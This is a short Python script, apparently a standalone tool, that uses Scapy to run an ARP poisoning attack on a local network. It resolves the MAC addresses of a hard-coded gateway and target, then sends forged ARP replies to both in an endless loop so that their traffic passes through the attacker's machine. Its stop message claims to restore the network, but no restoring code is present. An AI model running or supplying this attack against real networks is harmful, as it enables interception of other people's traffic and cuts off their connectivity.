from scapy.all import *

#ARP Poison parameters
gateway_ip = '192.168.225.1'
target_ip = '192.168.225.25'
packet_count = 1000
conf.iface = dev_from_index(21)
conf.verb = 0

#Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
#an ARP reply with MAC Address
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    result, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    return result[0][1].hwsrc


def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        

gateway_mac = get_mac(gateway_ip)
target_mac = get_mac(target_ip)

arp_poison(gateway_ip, gateway_mac, target_ip, target_mac)